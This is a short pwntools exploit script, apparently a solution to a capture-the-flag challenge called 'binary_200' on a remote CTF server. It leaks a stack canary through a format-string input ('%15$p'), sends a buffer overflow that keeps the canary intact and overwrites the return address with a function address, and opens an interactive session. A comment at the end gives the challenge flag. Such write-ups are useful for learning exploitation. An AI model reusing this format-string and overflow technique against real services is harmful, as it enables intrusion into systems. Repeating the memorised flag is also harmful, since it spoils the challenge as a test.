from pwn import *


l = 0
if l:
    r = process("./binary_200")
    pause()
    e = ELF("./binary_200")
else:
    r = remote("bamboofox.cs.nctu.edu.tw",22002)

func = 0x804854d
r.sendline("%15$p")
canary = int(r.recv(),16)

info(hex(canary))
p = flat(
    'a'*(0xec-0xc4),   # v5-s
    p32(canary),
    'b'*(0xf8-0xec),   # ebp-v5
    p32(func)
)
r.sendline(p)
r.interactive()


# BAMBOOFOX{YOU_PASS_THE_CANARY_WITH_FORMAT_STRING_OR_NOT}